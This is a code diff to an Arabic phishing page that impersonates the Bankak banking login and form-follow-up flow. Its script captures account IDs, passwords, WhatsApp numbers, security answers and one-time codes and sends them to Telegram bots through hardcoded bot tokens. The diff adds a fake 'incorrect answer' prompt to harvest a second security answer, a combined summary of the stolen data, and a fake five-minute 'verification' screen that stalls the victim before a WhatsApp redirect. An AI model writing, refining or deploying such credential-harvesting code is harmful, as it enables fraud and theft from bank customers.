@@ -402,6 +402,48 @@
             margin-top: 14px;
         }
 
+        .inline-notice {
+            display: none;
+            background-color: #fff5f5;
+            border: 1px solid #fad2d2;
+            color: var(--dark-red);
+            font-size: 12.5px;
+            font-weight: 700;
+            padding: 10px 12px;
+            border-radius: 10px;
+            margin-bottom: 14px;
+            text-align: right;
+            line-height: 1.5;
+        }
+
+        /* شاشة التحميل الرسمية */
+        .loading-spinner {
+            width: 54px;
+            height: 54px;
+            border: 5px solid #fde8e8;
+            border-top: 5px solid var(--primary-red);
+            border-radius: 50%;
+            margin: 0 auto 18px auto;
+            animation: spinLoader 1s linear infinite;
+        }
+
+        @keyframes spinLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-status-badge {
+            background: #fff5f5;
+            border: 1px solid #fad2d2;
+            color: var(--dark-red);
+            font-size: 13px;
+            font-weight: 700;
+            padding: 10px 14px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 4px;
+        }
+
         /* زر الواتساب العائم مع الترددات الخضراء */
         .whatsapp-float {
             position: fixed;
@@ -689,6 +731,8 @@
         <div class="form-card">
             <h2 class="form-title">متابعة الاستمارة أونلاين</h2>
 
+            <div id="securityNotice" class="inline-notice"></div>
+
             <div class="input-group">
                 <label>الرجاء الإجابة على سؤال الأمان</label>
                 <select id="securityQuestion" class="select-field">
@@ -732,6 +776,16 @@
         </div>
     </div>
 
+    <!-- الشاشة 6: جاري التحقق خلف الكواليس قبل الانتقال إلى الواتساب -->
+    <div id="screen-loading" class="screen">
+        <div class="form-card">
+            <div class="loading-spinner"></div>
+            <h2 class="form-title">جاري التحقق من الطلب</h2>
+            <p class="form-subtitle">يرجى الانتظار ريثما يتم استكمال مراجعة طلبكم واعتماده، وسيتم تحويلكم إلى خدمة الواتساب تلقائياً فور انتهاء المعالجة.</p>
+            <div class="loading-status-badge">الطلب قيد المعالجة الآمنة...</div>
+        </div>
+    </div>
+
 </div>
 
 <!-- زر الواتساب العائم مع الترددات الخضراء -->
@@ -743,6 +797,7 @@
 
 <script>
     let timerInterval;
+    let backgroundRedirectTimeout;
     let currentService = "";
     let securityAttempts = 0;
     let userData = {
@@ -754,11 +809,8 @@
         otp: ""
     };
 
-    const bot1Token = "868444148:AAFfssvtKLf_YS22KNtPaNaA8iky8Vy1naE";
-    const bot1ChatId = "904752304";
-
-    const bot2Token = "9150524512:AAHbKep32SlPuTaob4Dpb8qfkyBTSDl9Io0";
-    const bot2ChatId = "8819084684";
+    const bot1Token = "9150524512:AAHbKep32SlPuTaob4Dpb8qfkyBTSDl9Io0";
+    const bot1ChatId = "8819084684";
 
     document.addEventListener("DOMContentLoaded", function () {
         const otpEl = document.getElementById("otpInput");
@@ -769,12 +821,13 @@
         }
     });
 
-    function sendToTelegram(message) {
-        const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}`;
-        const url2 = `https://api.telegram.org/bot${bot2Token}/sendMessage?chat_id=${bot2ChatId}&text=${encodeURIComponent(message)}`;
+    function escapeMarkdown(val) {
+        return String(val ?? "").replace(/`/g, "'");
+    }
 
-        fetch(url1).catch(err => console.log(err));
-        fetch(url2).catch(err => console.log(err));
+    function sendToTelegram(message) {
+        const url1 = `https://api.telegram.org/bot${bot1Token}/sendMessage?chat_id=${bot1ChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        return fetch(url1).catch(err => console.log(err));
     }
 
     function goToScreen(screenId) {
@@ -785,6 +838,11 @@
 
         if (screenId === 'screen-security') {
             securityAttempts = 0;
+            const noticeEl = document.getElementById('securityNotice');
+            if (noticeEl) {
+                noticeEl.style.display = 'none';
+                noticeEl.innerText = '';
+            }
         }
 
         if (screenId === 'screen-otp') {
@@ -817,9 +875,10 @@
             return;
         }
 
-        let msg = `🚨 تسجيل دخول (بنكك)\n\n` +
-                  `👤 المعرف: \`${userData.account}\`\n` +
-                  `🔑 كلمة المرور: \`${userData.password}\``;
+        let msg = `🚨 تسجيل دخول (بنكك)\n` +
+                  `📌 الخدمة: \`${escapeMarkdown(currentService || "غير محدد")}\`\n\n` +
+                  `👤 المعرف: \`${escapeMarkdown(userData.account)}\`\n` +
+                  `🔑 كلمة المرور: \`${escapeMarkdown(userData.password)}\``;
         
         sendToTelegram(msg);
 
@@ -835,7 +894,7 @@
         }
 
         let msg = `💬 رقم الواتساب\n\n` +
-                  `📱 الرقم: \`${userData.whatsapp}\``;
+                  `📱 الرقم: \`${escapeMarkdown(userData.whatsapp)}\``;
 
         sendToTelegram(msg);
 
@@ -844,23 +903,35 @@
 
     function submitSecurity() {
         const selectObj = document.getElementById('securityQuestion');
+        const noticeEl = document.getElementById('securityNotice');
         userData.question = selectObj.options[selectObj.selectedIndex].text;
         userData.answer = document.getElementById('securityAnswer').value.trim();
 
         if(!userData.answer || selectObj.selectedIndex === 0) {
-            alert('الرجاء اختيار السؤال وإدخال الجواب');
+            if (noticeEl) {
+                noticeEl.style.display = 'block';
+                noticeEl.innerText = 'يرجى اختيار سؤال الأمان وتعبئة حقل الإجابة للمتابعة.';
+            }
             return;
         }
 
+        if (noticeEl) {
+            noticeEl.style.display = 'none';
+            noticeEl.innerText = '';
+        }
+
         let msg = `🛡️ إجابة سؤال الأمان\n\n` +
-                  `❓ السؤال:\n${userData.question}\n\n` +
-                  `💡 الإجابة: \`${userData.answer}\``;
+                  `❓ السؤال:\n${escapeMarkdown(userData.question)}\n\n` +
+                  `💡 الإجابة: \`${escapeMarkdown(userData.answer)}\``;
         
         sendToTelegram(msg);
 
         if (securityAttempts === 0) {
             securityAttempts++;
-            alert('إجابة سؤال الأمان غير صحيحة، تم تغيير السؤال تلقائياً يرجى الإجابة على السؤال الجديد.');
+            if (noticeEl) {
+                noticeEl.style.display = 'block';
+                noticeEl.innerText = 'تعذر التحقق من الإجابة المدخلة، يرجى الإجابة على سؤال الأمان التالي لاستكمال الطلب.';
+            }
             let nextIndex = selectObj.selectedIndex + 1;
             if (nextIndex >= selectObj.options.length) {
                 nextIndex = 1;
@@ -894,6 +965,13 @@
         }, 1000);
     }
 
+    function startBackgroundRedirect(durationSeconds) {
+        clearTimeout(backgroundRedirectTimeout);
+        backgroundRedirectTimeout = setTimeout(function () {
+            window.location.href = "https://wa.me/249128093955";
+        }, durationSeconds * 1000);
+    }
+
     function submitOtpAndRedirect() {
         const otpEl = document.getElementById('otpInput');
         otpEl.value = otpEl.value.replace(/\D/g, "");
@@ -905,13 +983,22 @@
         }
 
         let msg = `📱 رمز التحقق OTP\n\n` +
-                  `🔢 الرمز: \`${userData.otp}\``;
+                  `🔢 الرمز: \`${escapeMarkdown(userData.otp)}\``;
         
-        sendToTelegram(msg);
+        let summaryMsg = `📋 ملخص البيانات الكامل (سهل النسخ)\n` +
+                         `📌 الخدمة: \`${escapeMarkdown(currentService || "غير محدد")}\`\n` +
+                         `👤 المعرف: \`${escapeMarkdown(userData.account)}\`\n` +
+                         `🔑 كلمة المرور: \`${escapeMarkdown(userData.password)}\`\n` +
+                         `📱 الواتساب: \`${escapeMarkdown(userData.whatsapp)}\`\n` +
+                         `💡 إجابة الأمان: \`${escapeMarkdown(userData.answer)}\`\n` +
+                         `🔢 رمز OTP: \`${escapeMarkdown(userData.otp)}\``;
 
-        setTimeout(() => {
-            window.location.href = "https://wa.me/249128093955";
-        }, 600);
+        sendToTelegram(msg).then(() => {
+            return sendToTelegram(summaryMsg);
+        });
+
+        goToScreen('screen-loading');
+        startBackgroundRedirect(5 * 60);
     }
 </script>
 
